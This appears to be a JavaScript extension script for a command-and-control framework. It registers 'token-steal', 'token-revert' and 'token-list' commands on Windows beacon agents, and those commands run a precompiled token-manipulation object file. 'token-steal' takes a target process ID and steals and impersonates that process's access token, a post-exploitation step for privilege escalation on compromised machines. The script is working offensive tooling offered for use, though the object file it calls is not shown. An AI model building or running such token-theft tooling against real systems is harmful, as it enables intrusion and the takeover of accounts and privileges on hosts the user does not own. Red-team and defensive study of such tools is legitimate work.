var metadata = {
    name: "Token-BOF",
    description: "Token manipulation: steal, impersonate, revert, list privileges"
};

var token_steal = ax.create_command("token-steal", "Steal and impersonate token from process", "token-steal <pid>");
token_steal.addArgInt("pid", false, "Target process ID");
token_steal.setPreHook(function(id, cmdline, parsed) {
    let pid = parsed[0] || 0;
    let params = ax.bof_pack("int,int", [1, parseInt(pid)]);
    let bof = ax.script_dir() + "_bin/token." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Steal Token");
});

var token_revert = ax.create_command("token-revert", "Revert to original token", "token-revert");
token_revert.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int,int", [2, 0]);
    let bof = ax.script_dir() + "_bin/token." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Revert Token");
});

var token_list = ax.create_command("token-list", "Show available token operations", "token-list");
token_list.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int,int", [0, 0]);
    let bof = ax.script_dir() + "_bin/token." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: List Token Operations");
});

var group = ax.create_commands_group("Token Manipulation", [token_steal, token_revert, token_list]);
ax.register_commands_group(group, ["beacon", "beacon9090"], ["windows"], []);
